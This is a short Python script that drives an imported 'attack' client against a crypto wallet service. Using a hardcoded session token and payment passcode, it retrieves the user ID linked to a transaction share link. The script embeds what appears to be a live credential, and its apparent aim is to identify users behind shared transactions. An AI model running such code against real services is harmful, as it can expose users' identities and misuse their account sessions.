import base64
import json
import httpx
import asyncio
from post import post
from attack import CWalletClient
from coin import COINS


def main():
    authCookie = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzI3NmZnejg5M2pieWhibTh6YWplc3dwZXBqeSIsInNlc3Npb25faWQiOiI0MDk2N3NxZzltcXpiaWJzanE1YW0zNnhkNHJhaGUiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ1NjQ2MDYsImlhdCI6MTc3MTQ5MjYwNn0.WaYNCgKpUPE-PTSDivVkK3G4XpgH1YcJGRa52AYlijs"
    client = CWalletClient(authCookie=authCookie, payPassCode="111111")
    # Wrap the async call in asyncio.run()
    Id = "202602190959532024423686904365056"
    address = "0x2a8435c5D3607F9b8DA7E778f5bcd62cEb57b337"
    userId = asyncio.run(client.getTransactionShareLinkUserId(Id))
    print(userId)


if __name__ == "__main__":
    main()
